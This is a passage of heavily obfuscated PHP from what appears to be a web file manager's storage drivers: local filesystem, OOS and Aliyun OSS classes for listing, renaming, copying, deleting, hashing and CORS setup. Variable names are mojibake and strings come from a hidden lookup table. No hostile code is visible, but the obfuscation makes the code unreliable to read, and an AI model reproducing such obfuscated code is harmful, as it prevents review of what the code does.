(!$this->delFolder($‚¹˜”¨)) { return !1; } } } } closedir($ŒŞĞ­ß»); return rmdir($—Ô¨êúè); } public function rename($Öğ•Ìáı, $«æøÅ¯) { $Ú“Ëïª =& $_SERVER[Ãìšã«™]; $¼©Œ´™÷ = $this->fileNameAuto($this->pathFather($Öğ•Ìáı), $«æøÅ¯); $¼©Œ´™÷ = $this->iconvSystem($¼©Œ´™÷); $Öğ•Ìáı = $this->iconvSystem($Öğ•Ìáı); $Œãì÷íå = $this->pathFather($Öğ•Ìáı); $±–ˆÙÔ¼ = rtrim($Œãì÷íå, $Ú“Ëïª[8]) . $Ú“Ëïª[8] . $¼©Œ´™÷; $İÕÂ¹şı = @rename($Öğ•Ìáı, $±–ˆÙÔ¼); $±–ˆÙÔ¼ = $this->iconvApp($±–ˆÙÔ¼); return $İÕÂ¹şı ? $this->getPathOuter($±–ˆÙÔ¼) : !1; } public function size($‘•õË¶£) { $‘•õË¶£ = $this->iconvSystem($‘•õË¶£); return filesize_64($‘•õË¶£); } public function info($œß…¿·û) { $œß…¿·û = $this->iconvSystem($œß…¿·û); if ($this->isFolder($œß…¿·û)) { return $this->folderInfo($œß…¿·û); } else { if ($this->isFile($œß…¿·û)) { return $this->fileInfo($œß…¿·û); } } return !1; } protected function infoChildren($„ê‰¨…¯, &$óøğ¨Ç, $Ä¿–Ê×ƒ = true) { $Œï›şğ£ =& $_SERVER[Ãìšã«™]; check_abort_echo(); $„ê‰¨…¯ = rtrim($„ê‰¨…¯, $Œï›şğ£[8]) . $Œï›şğ£[8]; if ($Ä¿–Ê×ƒ) { $„ê‰¨…¯ = $this->iconvSystem($„ê‰¨…¯); } if (!($Ş¡ãåÇ¢ = @opendir($„ê‰¨…¯))) { return; } while (($îÃöÏ = readdir($Ş¡ãåÇ¢)) !== !1) { if ($îÃöÏ == $Œï›şğ£[10] || $îÃöÏ == $Œï›şğ£[1368]) { continue; } $„¿Æ¾Ïé = $„ê‰¨…¯ . $îÃöÏ; if (is_file($„¿Æ¾Ïé) || is_link($„¿Æ¾Ïé)) { $óøğ¨Ç[$Œï›şğ£[81]]++; $óøğ¨Ç[$Œï›şğ£[80]] += filesize_64($„¿Æ¾Ïé); } else { if (is_dir($„¿Æ¾Ïé)) { $óøğ¨Ç[$Œï›şğ£[82]]++; $this->infoChildren($„¿Æ¾Ïé, $óøğ¨Ç, !1); } } } closedir($Ş¡ãåÇ¢); } private function folderInfo($ø„‡ºÃ®, $™ÅøØè° = false) { $ğ‹™€¹¯ =& $_SERVER[Ãìšã«™]; $ø„‡ºÃ® = rtrim($ø„‡ºÃ®, $ğ‹™€¹¯[8]) . $ğ‹™€¹¯[8]; $¾ºõùŒã = $this->iconvApp($this->pathThis($ø„‡ºÃ®)); if ($™ÅøØè°) { return array($ğ‹™€¹¯[32] => $¾ºõùŒã, $ğ‹™€¹¯[78] => $this->getPathOuter($ø„‡ºÃ®), $ğ‹™€¹¯[33] => $ğ‹™€¹¯[79]); } $òéÍ³š = array($ğ‹™€¹¯[32] => $¾ºõùŒã, $ğ‹™€¹¯[78] => $this->getPathOuter($ø„‡ºÃ®), $ğ‹™€¹¯[33] => $ğ‹™€¹¯[79], $ğ‹™€¹¯[193] => @filectime($ø„‡ºÃ®), $ğ‹™€¹¯[86] => @filemtime($ø„‡ºÃ®), $ğ‹™€¹¯[1371] => @fileatime($ø„‡ºÃ®), $ğ‹™€¹¯[1372] => is_readable($ø„‡ºÃ®), $ğ‹™€¹¯[1373] => is_writable($ø„‡ºÃ®), $ğ‹™€¹¯[1374] => get_mode($ø„‡ºÃ®)); return $òéÍ³š; } private function fileInfo($İŸªÙñ, $øÃ¾àô€ = false) { $½ÉÉ®è =& $_SERVER[Ãìšã«™]; $ëÔÉªç„ = $this->iconvApp($this->pathThis($İŸªÙñ)); if ($øÃ¾àô€) { return array($½ÉÉ®è[32] => $ëÔÉªç„, $½ÉÉ®è[78] => $this->getPathOuter($İŸªÙñ), $½ÉÉ®è[33] => $½ÉÉ®è[192], $½ÉÉ®è[80] => $this->size($İŸªÙñ), $½ÉÉ®è[167] => $this->ext($ëÔÉªç„)); } $®ñÆ†Ê = array($½ÉÉ®è[32] => $ëÔÉªç„, $½ÉÉ®è[78] => $this->getPathOuter($İŸªÙñ), $½ÉÉ®è[33] => $½ÉÉ®è[192], $½ÉÉ®è[193] => @filectime($İŸªÙñ), $½ÉÉ®è[86] => @filemtime($İŸªÙñ), $½ÉÉ®è[1371] => @fileatime($İŸªÙñ), $½ÉÉ®è[80] => $this->size($İŸªÙñ), $½ÉÉ®è[167] => $this->ext($ëÔÉªç„), $½ÉÉ®è[1372] => is_readable($İŸªÙñ), $½ÉÉ®è[1373] => is_writable($İŸªÙñ), $½ÉÉ®è[1374] => get_mode($İŸªÙñ)); return $®ñÆ†Ê; } public function exist($âÊÅ®ÛŠ) { $âÊÅ®ÛŠ = $this->iconvSystem($âÊÅ®ÛŠ); return @file_exists($âÊÅ®ÛŠ); } public function isFile($í­¬…ÍÓ) { $í­¬…ÍÓ = $this->iconvSystem($í­¬…ÍÓ); return @is_file($í­¬…ÍÓ); } public function isFolder($—×Û™æÈ) { $—×Û™æÈ = $this->iconvSystem($—×Û™æÈ); return @is_dir($—×Û™æÈ); } public function listPath($‚¸‚Îß, $¢Ù’ƒÀË = false) { $á‚ØÇ˜ =& $_SERVER[Ãìšã«™]; $‚¸‚Îß = $this->iconvSystem($‚¸‚Îß); $‚¸‚Îß = rtrim($‚¸‚Îß, $á‚ØÇ˜[8]) . $á‚ØÇ˜[8]; $‘ÛÄşñß = array($á‚ØÇ˜[77] => array(), $á‚ØÇ˜[76] => array()); if (!($°ĞöûñÔ = @opendir($‚¸‚Îß))) { return $‘ÛÄşñß; } while (($Æ¯ê»³² = readdir($°ĞöûñÔ)) !== !1) { if ($Æ¯ê»³² == $á‚ØÇ˜[10] || $Æ¯ê»³² == $á‚ØÇ˜[1368]) { continue; } $šÙ‡±— = $‚¸‚Îß . $Æ¯ê»³²; if (is_file($šÙ‡±—)) { $‘ÛÄşñß[$á‚ØÇ˜[76]][] = $this->fileInfo($šÙ‡±—, $¢Ù’ƒÀË); } else { $‘ÛÄşñß[$á‚ØÇ˜[77]][] = $this->folderInfo($šÙ‡±—, $¢Ù’ƒÀË); } } closedir($°ĞöûñÔ); return $‘ÛÄşñß; } public function listAll($®¶ô¢…”, &$ñ¾ƒù¹À = array()) { $°µÛìî§ =& $_SERVER[Ãìšã«™]; $®¶ô¢…” = $this->iconvSystem($®¶ô¢…”); $®¶ô¢…” = rtrim($®¶ô¢…”, $°µÛìî§[8]) . $°µÛìî§[8]; if (!($ş°®·Ú¹ = @opendir($®¶ô¢…”))) { return $ñ¾ƒù¹À; } while (($¡Ùƒ˜  = readdir($ş°®·Ú¹)) !== !1) { if ($¡Ùƒ˜  == $°µÛìî§[10] || $¡Ùƒ˜  == $°µÛìî§[1368]) { continue; } $¨³€´Õì = $®¶ô¢…” . $¡Ùƒ˜ ; if (is_dir($¨³€´Õì) && !is_link($¨³€´Õì)) { $ñ¾ƒù¹À[] = array($°µÛìî§[78] => $¨³€´Õì . $°µÛìî§[8], $°µÛìî§[79] => 1, $°µÛìî§[86] => @filemtime($¨³€´Õì), $°µÛìî§[80] => 0); $this->listAll($¨³€´Õì, $ñ¾ƒù¹À); } else { $ñ¾ƒù¹À[] = array($°µÛìî§[78] => $¨³€´Õì, $°µÛìî§[79] => 0, $°µÛìî§[86] => @filemtime($¨³€´Õì), $°µÛìî§[80] => $this->size($¨³€´Õì)); } } closedir($ş°®·Ú¹); return $ñ¾ƒù¹À; } public function has($¶¤ÃÙ¬Ê, $—¥ãŞèÁ = false, $èÂÔö¥´ = true) { $ñºîŒ×¢ =& $_SERVER[Ãìšã«™]; $¶¤ÃÙ¬Ê = $this->iconvSystem($¶¤ÃÙ¬Ê); $¶¤ÃÙ¬Ê = rtrim($¶¤ÃÙ¬Ê, $ñºîŒ×¢[8]) . $ñºîŒ×¢[8]; if (!($ÇÃÂÄç = @opendir($¶¤ÃÙ¬Ê))) { return !1; } $êÄÏº™ê = 0; $‰³„¤» = 0; $Š–Ş³› = 0; while (($¬˜—ÕÆ„ = readdir($ÇÃÂÄç)) !== !1) { if ($¬˜—ÕÆ„ == $ñºîŒ×¢[10] || $¬˜—ÕÆ„ == $ñºîŒ×¢[1368]) { continue; } $÷„ÒæÏ = $¶¤ÃÙ¬Ê . $¬˜—ÕÆ„; if ($—¥ãŞèÁ) { $Š–Ş³›++; if (@is_file($÷„ÒæÏ)) { $êÄÏº™ê++; } else { $‰³„¤»++; } if ($Š–Ş³› > 10000) { break; } continue; } if ($èÂÔö¥´) { if (@is_file($÷„ÒæÏ)) { return !0; } } else { if (@is_dir($÷„ÒæÏ . $ñºîŒ×¢[8])) { return !0; } } } closedir($ÇÃÂÄç); if ($—¥ãŞèÁ) { return array($ñºîŒ×¢[202] => $êÄÏº™ê, $ñºîŒ×¢[203] => $‰³„¤»); } return !1; } public function hashSimple($®–Úúµõ) { $€ËÓ£àÉ =& $_SERVER[Ãìšã«™]; if (!$®–Úúµõ) { return md5($€ËÓ£àÉ[12]); } $®–Úúµõ = $this->iconvSystem($®–Úúµõ); $ã¨Ø£á¹ = $this->size($®–Úúµõ); $Ì®ÈŞ¨Ï = 200; $Ÿ¥¶Şˆ£ = 50; if ($ã¨Ø£á¹ <= $Ì®ÈŞ¨Ï * $Ÿ¥¶Şˆ£) { return $this->hashMd5($®–Úúµõ) . $ã¨Ø£á¹; } $ÜíĞ¯«Ë = $€ËÓ£àÉ[12]; $£àøºğ… = intval($ã¨Ø£á¹ / $Ÿ¥¶Şˆ£); $Ì‹Ôî»³ = fopen($®–Úúµõ, $€ËÓ£àÉ[1375]); if (!$Ì‹Ôî»³) { return $ÜíĞ¯«Ë; } for ($åó–ƒİ = 0; $åó–ƒİ < $Ÿ¥¶Şˆ£; $åó–ƒİ++) { fseek_64($Ì‹Ôî»³, $£àøºğ… * $åó–ƒİ); $ÜíĞ¯«Ë .= fread($Ì‹Ôî»³, $Ì®ÈŞ¨Ï); } fseek_64($Ì‹Ôî»³, $ã¨Ø£á¹ - $Ì®ÈŞ¨Ï); $ÜíĞ¯«Ë .= fread($Ì‹Ôî»³, $Ì®ÈŞ¨Ï); fclose($Ì‹Ôî»³); return md5($ÜíĞ¯«Ë) . $ã¨Ø£á¹; } public function getContent($Â£Îû‚) { $Â£Îû‚ = $this->iconvSystem($Â£Îû‚); return file_get_contents($Â£Îû‚); } public function setContent($…²é¬¿ê, $åÕò¨ó› = '') { $…²é¬¿ê = $this->iconvSystem($…²é¬¿ê); $˜Ê¤³ú” = @file_put_contents($…²é¬¿ê, $åÕò¨ó›, LOCK_EX); clearstatcache(); @chmod($…²é¬¿ê, $this->pathAuth); return $˜Ê¤³ú” === !1 ? !1 : !0; } public function fileSubstr($ŞÏ¯™÷, $ÅËÏ²Ğ½ = 0, $Ù‘À¯ğã = false) { $Ÿá¥çËˆ =& $_SERVER[Ãìšã«™]; $ŞÏ¯™÷ = $this->iconvSystem($ŞÏ¯™÷); if ($Ù‘À¯ğã === !1) { $Ù‘À¯ğã = $this->size($ŞÏ¯™÷); } if ($Ù‘À¯ğã <= 0) { return $Ÿá¥çËˆ[12]; } $Ÿã¾±à› = fopen($ŞÏ¯™÷, $Ÿá¥çËˆ[1375]); if (!$Ÿã¾±à›) { return !1; } fseek_64($Ÿã¾±à›, $ÅËÏ²Ğ½); $ÖîË‰Àù = fread($Ÿã¾±à›, $Ù‘À¯ğã); fclose($Ÿã¾±à›); return $ÖîË‰Àù; } public function upload($¶˜÷Ó«×, $Ñ™Æø¸ò, $ÏÖÍşû = false, $×ÛşÖ‡´ = REPEAT_REPLACE) { if ($ÏÖÍşû) { return $this->moveFile($Ñ™Æø¸ò, $¶˜÷Ó«×); } return $this->copyFile($Ñ™Æø¸ò, $¶˜÷Ó«×); } public function setModifyTime($òæÒï²¼, $™‡¡Õúï = '') { @touch($òæÒï²¼, intval($™‡¡Õúï)); } public function download($°æšŠ­¿, $ŞÙ½ä÷) { return $this->iconvSystem($°æšŠ­¿); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($„ß´€™) { parent::__construct($„ß´€™); $this->signatureVersion($_SERVER[Ãìšã«™][211]); } public function fileOutLink($“Ş÷Ê) { $²ÇôıùÓ =& $_SERVER[Ãìšã«™]; if (substr($“Ş÷Ê, 0, 7) == $²ÇôıùÓ[1319]) { $“Ş÷Ê = $²ÇôıùÓ[1320] . substr($“Ş÷Ê, 7); } header($²ÇôıùÓ[158] . $“Ş÷Ê); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($”Û‰¾ô) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ãìšã«™][1376]; $this->_init($”Û‰¾ô); } public function _init($Š’áÓ“Ş) { $˜šÒ«ø‚ =& $_SERVER[Ãìšã«™]; foreach ($Š’áÓ“Ş as $ãÒÔó®© => $®ßéùíş) { if (isset($this->{$ãÒÔó®©})) { $this->{$ãÒÔó®©} = $®ßéùíş; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($˜šÒ«ø‚[1377] . LNG($˜šÒ«ø‚[1378])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $«½ş’Øõ =& $_SERVER[Ãìšã«™]; $†õŸÙÓë = new OSS\Model\CorsConfig(); $ã¼ƒÆüá = new OSS\Model\CorsRule(); $ã¼ƒÆüá->addAllowedOrigin($«½ş’Øõ[1379]); $ã¼ƒÆüá->addAllowedMethod($«½ş’Øõ[1380]); $ã¼ƒÆüá->addAllowedMethod($«½ş’Øõ[1381]); $ã¼ƒÆüá->addAllowedMethod($«½ş’Øõ[1382]); $ã¼ƒÆüá->addAllowedMethod($«½ş’Øõ[1383]); $ã¼ƒÆüá->addAllowedMethod($«½ş’Øõ[157]); $ã¼ƒÆüá->setMaxAgeSeconds(600); $ã¼ƒÆüá->addExposeHeader($«½ş’Øõ[1384]); $ã¼ƒÆüá->addAllowedHeader($«½ş’Øõ[1379]); $†õŸÙÓë->addRule($ã¼ƒÆüá); try { $this->client->putBucketCors($this->bucket, $†õŸÙÓë); } catch (OSS\Core\OssException $¡Ì¹±ƒ†) { return !1; } return !0; } public function getBucketCors() { $üÙ¬ú³× =& $_SERVER[Ãìšã«™]; $´—ïã½® = null; try { $´—ïã½® = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $”²åå) { return null; } if (!$´—ïã½® || !($â¶Ò¶ø€ = $´—ïã½®->getRules())) { return null; } $Û¡§ÒÎ§ = $â¶Ò¶ø€[0]->getAllowedOrigins(); $òìĞÅÛ = $â¶Ò¶ø€[0]->getAllowedMethods(); $ìäÚæ¦Û = $â¶Ò¶ø€[0]->getMaxAgeSeconds(); $ïÃ½Ùéí = $â¶Ò¶ø€[0]->getExposeHeaders(); $ıİ…±€ = $â¶Ò¶ø€[0]->getAllowedHeaders(); return array($üÙ¬ú³×[180] => isset($Û¡§ÒÎ§[0]) ? $Û¡§ÒÎ§[0] : $üÙ¬ú³×[12], $üÙ¬ú³×[184] => $òìĞÅÛ, $üÙ¬ú³×[1385] => $ìäÚæ¦Û, $üÙ¬ú³×[1386] => isset($ïÃ½Ùéí[0]) ? $ïÃ½Ùéí[0] : $üÙ¬ú³×[12], $üÙ¬ú³×[182] => isset($ıİ…±€[0]) ? $ıİ…±€[0] : $üÙ¬ú³×[12]); } public function isBucketCors() { $„É¯µö =& $_SERVER[Ãìšã«™]; $áˆÍÈ© = $this->getBucketCors(); if (!$áˆÍÈ© || !is_array($áˆÍÈ©)) { return !1; } if ($áˆÍÈ©[$„É¯µö[180]] != $„É¯µö[181] || $áˆÍÈ©[$„É¯µö[182]] != $„É¯µö[181]) { return !1; } $ñå¿Ÿš£ = array_map($„É¯µö[183], $áˆÍÈ©[$„É¯µö[184]]); if (!is_array($ñå¿Ÿš£)) { $ñå¿Ÿš£ = array(); } $Ôïè¹ú— = array($„É¯µö[185], $„É¯µö[186], $„É¯µö[187], $„É¯µö[188], $„É¯µö[189]); $†©Ñ±İ = array_diff($Ôïè¹ú—, $ñå¿Ÿš£); return empty($†©Ñ±İ); } public function mkfile($Æú¢úÕ, $† «œÑ° = '', $×ª³³¼‰ = REPEAT_RENAME) { $°—ÆğÕ— = $this->setContent($Æú¢úÕ, $† «œÑ°); if ($°—ÆğÕ— !== !1) { return $this->getPathOuter($Æú¢úÕ); } return !1; } public function mkdir($íìŸÈÉì, $åğï ©Ş = REPEAT_SKIP) { if ($this->_isFolder($íìŸÈÉì)) { return $this->getPathOuter($íìŸÈÉì); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($íìŸÈÉì)); } catch (OSS\Core\OssException $«ş›ÙÊÑ) { return !1; } return $this->getPathOuter($íìŸÈÉì); } private function fileList($ñ¿¥ªÅß, $ÏÁ¹µ¨Û = '', $Á§§Ğ‡­ = 0) { $ã·Î´Æò =& $_SERVER[Ãìšã«™]; $ñ¿¥ªÅß = trim($ñ¿¥ªÅß, $ã·Î´Æò[8]); $£š¤º£ı = empty($ñ¿¥ªÅß) && $ñ¿¥ªÅß !== $ã·Î´Æò[190] ? $ã·Î´Æò[12] : $ñ¿¥ªÅß . $ã·Î´Æò[8]; $ÇÂ¢¨ƒü = $ã·Î´Æò[12]; $®âáÖÃÊ = 1000; $€ƒöçĞ = $this->listItemCache === !1 ? !1 : !0; $ÈæÈŠ¿± = $»è›¡ŸÎ = array(); while (!0) { check_abort(); $°¼÷“Ï¹ = array($ã·Î´Æò[1387] => $ÏÁ¹µ¨Û, $ã·Î´Æò[1388] => $£š¤º£ı, $ã·Î´Æò[1389] => $®âáÖÃÊ, $ã·Î´Æò[1390] => $ÇÂ¢¨ƒü); try { $±Ü´µ½À = $this->client->listObjects($this->bucket, $°¼÷“Ï¹); } catch (OSS\Core\OssException $Ú ÅÂ¹Ã) { break; } $ÇÂ¢¨ƒü = $±Ü´µ½À->getNextMarker(); $ƒ‹Œéúš = $±Ü´µ½À->getObjectList(); $£•ßıáØ = $±Ü´µ½À->getPrefixList(); foreach ($ƒ‹Œéúš as $³‡‰°åÄ) { if ($³‡‰°åÄ->getKey() == $£š¤º£ı) { continue; } $‘ÖÄÔü’ = $³‡‰°åÄ->getKey(); $Œéìîû = $³‡‰°åÄ->getSize(); $¡è‘¹¸º = $³‡‰°åÄ->getLastModified(); $Å‚îˆï· = $Á§§Ğ‡­ ? array($ã·Î´Æò[32] => $‘ÖÄÔü’, $ã·Î´Æò[80] => $Œéìîû, $ã·Î´Æò[196] => strtotime($¡è‘¹¸º)) : $‘ÖÄÔü’; $Å°şï = $Œéìîû == 0 && substr($‘ÖÄÔü’, strlen($‘ÖÄÔü’) - 1, 1) == $ã·Î´Æò[8] ? !0 : !1; if ($€ƒöçĞ) { $this->cacheMethod($ã·Î´Æò[198], $‘ÖÄÔü’, $Å°şï); $this->cacheMethod($ã·Î´Æò[199], $‘ÖÄÔü’, array($ã·Î´Æò[80] => $Œéìîû, $ã·Î´Æò[1391] => $Œéìîû, $ã·Î´Æò[86] => strtotime($¡è‘¹¸º), $ã·Î´Æò[1392] => $¡è‘¹¸º)); } if ($Å°şï) { $ÈæÈŠ¿±[] = $‘ÖÄÔü’; continue; } $»è›¡ŸÎ[] = $Å‚îˆï·; } foreach ($£•ßıáØ as $–ØÈ‰½ƒ) { $ÈæÈŠ¿±[] = $–ØÈ‰½ƒ->getPrefix(); if ($€ƒöçĞ) { $this->cacheMethod($ã·Î´Æò[198], $‘ÖÄÔü’, !0); } } if ($ÇÂ¢¨ƒü === $ã·Î´Æò[12]) { break; } } if ($€ƒöçĞ) { $this->cacheMethod($ã·Î´Æò[198], $ñ¿¥ªÅß, !0); } return array($ã·Î´Æò[77] => $ÈæÈŠ¿±, $ã·Î´Æò[76] => $»è›¡ŸÎ); } public function copyFile($³úÁÑÍ›, $‰»½©»È) { $ Şø©Ş = $this->size($³úÁÑÍ›); if ($ Şø©Ş < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $³úÁÑÍ›, $this->bucket, $this->pathEncode($‰»½©»È)); } catch (OSS\Core\OssException $Å™¢˜ğ¬) { return !1; } return $this->getPathOuter($‰»½©»È); } $ÆìÊ„¢ = $this->multiCopyObject($³úÁÑÍ›, $‰»½©»È, $ Şø©Ş); return $ÆìÊ„¢ ? $this->getPathOuter($‰»½©»È) : !1; } private function multiCopyObject($ÎÙûâÛå, $ŸºÛ–Û, $­ò¸¾¯Ø) { $œŒÈç““ =& $_SERVER[Ãìšã«™]; try { $–€´ŞÀğ = array(); if ($‰¬ ‚‚” = $this->hashMd5($ÎÙûâÛå)) { $–€´ŞÀğ = array(OSS\OssClient::OSS_HEADERS => array($œŒÈç““[1393] => $‰¬ ‚‚”)); } $Ä‹Ñ½­… = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ŸºÛ–Û), $–€´ŞÀğ); $»¿¾È¬× = 1; $êÙãéõ¿ = 0; $»³ºÎºâ = array(); $Ü€‰ªï¥ = 1024 * 1024 * 10; $Ø‰£Ë = $this->client->generateMultiuploadParts($­ò¸¾¯Ø, $Ü€‰ªï¥); foreach ($Ø‰£Ë as $Æ‚øº => $íŸÅƒ°Í) { $˜Œİ¿äë = $êÙãéõ¿ + (int) $íŸÅƒ°Í[$œŒÈç““[1394]]; $›úÔÎ¦Ì = (int) $íŸÅƒ°Í[$œŒÈç““[332]] + $˜Œİ¿äë - 1; $û×çşÛ¶ = array($œŒÈç““[1395] => $˜Œİ¿äë, $œŒÈç““[1396] => $›úÔÎ¦Ì); $»³ºÎºâ[] = $this->client->uploadPartCopy($this->bucket, $ÎÙûâÛå, $this->bucket, $this->pathEncode($ŸºÛ–Û), $»¿¾È¬×, $Ä‹Ñ½­…, $û×çşÛ¶); $»¿¾È¬× = $»¿¾È¬× + 1; } $‚²ìÛ–½ = array(); foreach ($»³ºÎºâ as $Æ‚øº => $¦ÍÒØŠ½) { $‚²ìÛ–½[] = array($œŒÈç““[1397] => $Æ‚øº + 1, $œŒÈç““[1398] => $¦ÍÒØŠ½); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ŸºÛ–Û), $Ä‹Ñ½­…, $‚²ìÛ–½); } catch (OSS\Core\OssException $­áÊæ¦”) { return !1; } return !0; } public function moveFile($®ÚÒ«¤¼, $Á¿êªêï) { if ($this->copyFile($®ÚÒ«¤¼, $Á¿êªêï)) { $this->remove($®ÚÒ«¤¼); return $this->getPathOuter($Á¿êªêï); } return !1; } public function delFile($ĞùÎŞ—‹) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ĞùÎŞ—‹)); } catch (OSS\Core\OssException $ †ÓÌÆ) { return !1; } return !0; } public function delFolder($òÂéë“) { $ıß¬à¸ =& $_SERVER[Ãìšã«™]; if (!$this->exist($òÂéë“)) { return !0; } $this->listItemCache = !1; $ƒ’³ÍåÂ = $this->fileList($òÂéë“); $this->listItemCache = !0; $¢”ØÀú½ = trim($òÂéë“, $ıß¬à¸[8]) . $ıß¬à¸[8]; if (!empty($òÂéë“) && $òÂéë“ !== $ıß¬à¸[190] && !in_array($¢”ØÀú½, $ƒ’³ÍåÂ[$ıß¬à¸[77]])) { $ƒ’³ÍåÂ[$ıß¬à¸[77]][] = $¢”ØÀú½; } $§êİÕ¸ˆ = $this->delByBatch($ƒ’³ÍåÂ[$ıß¬à¸[76]]); if (!$§êİÕ¸ˆ) { return !1; } $§êİÕ¸ˆ = $this->delByBatch($ƒ’³ÍåÂ[$ıß¬à¸[77]]); if (!$§êİÕ¸ˆ) { return !1; } return $this->delFile($¢”ØÀú½); } private function delByBatch($ïìš¹) { foreach (array_chunk($ïìš¹, 1000) as $¦àÓŞÍ¶) { try { $this->client->deleteObjects($this->bucket, $¦àÓŞÍ¶); } catch (OSS\Core\OssException $¶äôëŠî) { return !1; } } return !0; } public function rename($¥Ïù¸Î, $ª½‡‘ğ) { return $this->renameObject($¥Ïù¸Î, $ª½‡‘ğ); } private function fileInfo($îÁÇ¼Œ›, $ı›‰û®­ = false, $ê¾§õû² = array()) { $¶à¸À‘ˆ =& $_SERVER[Ãìšã«™]; $îõõÙâæ = array($¶à¸À‘ˆ[32] => $this->pathThis($îÁÇ¼Œ›), $¶à¸À‘ˆ[78] => $this->getPathOuter($îÁÇ¼Œ›), $¶à¸À‘ˆ[33] => $¶à¸À‘ˆ[192], $¶à¸À‘ˆ[80] => isset($ê¾§õû²[$¶à¸À‘ˆ[80]]) ? $ê¾§õû²[$¶à¸À‘ˆ[80]] : 0, $¶à¸À‘ˆ[167] => $this->ext($îÁÇ¼Œ›)); if ($ı›‰û®­) { return $îõõÙâæ; } $îõõÙâæ[$¶à¸À‘ˆ[193]] = $îõõÙâæ[$¶à¸À‘ˆ[86]] = 0; $îõõÙâæ[$¶à¸À‘ˆ[194]] = $îõõÙâæ[$¶à¸À‘ˆ[195]] = !0; if (empty($ê¾§õû²)) { $ƒ¿ÛÒÃ« = $this->objectMeta($îÁÇ¼Œ›); if (!$ƒ¿ÛÒÃ«) { return $îõõÙâæ; } $ê¾§õû² = array($¶à¸À‘ˆ[86] => strtotime($ƒ¿ÛÒÃ«[$¶à¸À‘ˆ[1392]]), $¶à¸À‘ˆ[80] => $ƒ¿ÛÒÃ«[$¶à¸À‘ˆ[1391]] + 0); } if (isset($ê¾§õû²[$¶à¸À‘ˆ[80]])) { $îõõÙâæ[$¶à¸À‘ˆ[80]] = $ê¾§õû²[$¶à¸À‘ˆ[80]]; } if (isset($ê¾§õû²[$¶à¸À‘ˆ[86]])) { $îõõÙâæ[$¶à¸À‘ˆ[86]] = $ê¾§õû²[$¶à¸À‘ˆ[86]]; } if (isset($ê¾§õû²[$¶à¸À‘ˆ[196]]) && !trim($îõõÙâæ[$¶à¸À‘ˆ[86]])) { $îõõÙâæ[$¶à¸À‘ˆ[86]] = $ê¾§õû²[$¶à¸À‘ˆ[196]]; } return $îõõÙâæ; } private function folderInfo($·ìãöÏô, $Ÿ¨‰´Õ  = false, $£Ãø´¥ = array()) { $‡½–¦ÂÓ =& $_SERVER[Ãìšã«™]; $åñù½«‹ = array($‡½–¦ÂÓ[32] => $this->pathThis($·ìãöÏô), $‡½–¦ÂÓ[78] => $this->getPathOuter($‡½–¦ÂÓ[8] . $·ìãöÏô), $‡½–¦ÂÓ[33] => $‡½–¦ÂÓ[79]); if ($Ÿ¨‰´Õ ) { return $åñù½«‹; } $åñù½«‹[$‡½–¦ÂÓ[193]] = $åñù½«‹[$‡½–¦ÂÓ[86]] = 0; $åñù½«‹[$‡½–¦ÂÓ[194]] = $åñù½«‹[$‡½–¦ÂÓ[195]] = !0; if (empty($£Ãø´¥)) { $·ìãöÏô = rtrim($·ìãöÏô, $‡½–¦ÂÓ[8]) . $‡½–¦ÂÓ[8]; $ÏçÊëéÍ = $this->objectMeta($·ìãöÏô); if (!$ÏçÊëéÍ) { return $åñù½«‹; } $£Ãø´¥ = array($‡½–¦ÂÓ[193] => $ÏçÊëéÍ[$‡½–¦ÂÓ[511]][$‡½–¦ÂÓ[1399]], $‡½–¦ÂÓ[86] => strtotime($ÏçÊëéÍ[$‡½–¦ÂÓ[1392]])); } if (isset($£Ãø´¥[$‡½–¦ÂÓ[86]])) { $åñù½«‹[$‡½–¦ÂÓ[86]] = $£Ãø´¥[$‡½–¦ÂÓ[86]]; } if (isset($£Ãø´¥[$‡½–¦ÂÓ[193]])) { $åñù½«‹[$‡½–¦ÂÓ[193]] = $£Ãø´¥[$‡½–¦ÂÓ[193]]; } return $åñù½«‹; } public function listPath($³ñ³Ä©ö, $¹Ç¬ñÊ = false) { $Š£üé® =& $_SERVER[Ãìšã«™]; $Õô§Œ™Ü = $this->fileList($³ñ³Ä©ö, $Š£üé®[8], !0); foreach ($Õô§Œ™Ü[$Š£üé®[77]] as $İê—œï => $‹åÎû¹) { $Õô§Œ™Ü[$Š£üé®[77]][$İê—œï] = $this->folderInfo($‹åÎû¹, $¹Ç¬ñÊ, $‹åÎû¹); } foreach ($Õô§Œ™Ü[$Š£üé®[76]] as $İê—œï => $‹åÎû¹) { $Õô§Œ™Ü[$Š£üé®[76]][$İê—œï] = $this->fileInfo($‹åÎû¹[$Š£üé®[32]], $¹Ç¬ñÊ, $‹åÎû¹); } return $Õô§Œ™Ü; } public function has($®íÛÁåŒ, $×ûğµÍ = false, $êü“Ë•Õ = true) { $í‚‹»€ =& $_SERVER[Ãìšã«™]; $®íÛÁåŒ = trim($®íÛÁåŒ, $í‚‹»€[8]); $à½¹¿Í = empty($®íÛÁåŒ) && $®íÛÁåŒ !== $í‚‹»€[190] ? $í‚‹»€[12] : $®íÛÁåŒ . $í‚‹»€[8]; $Éö±×Ü = $í‚‹»€[12]; $Ğ¹óí Ğ = 500; $ä°İÅü· = $ÎŸ€µãğ = 0; while (!0) { check_abort(); $¸äåÒ = array($í‚‹»€[1387] => $í‚‹»€[8], $í‚‹»€[1388] => $à½¹¿Í, $í‚‹»€[1389] => $Ğ¹óí Ğ, $í‚‹»€[1390] => $Éö±×Ü); try { $è×Ü±Ş = $this->client->listObjects($this->bucket, $¸äåÒ); } catch (OSS\Core\OssException $áû¢µ‘¤) { break; } $Éö±×Ü = $è×Ü±Ş->getNextMarker(); $”Ã†Ùè = $è×Ü±Ş->getObjectList(); $¾÷Ôºº· = $è×Ü±Ş->getPrefixList(); if ($×ûğµÍ) { if 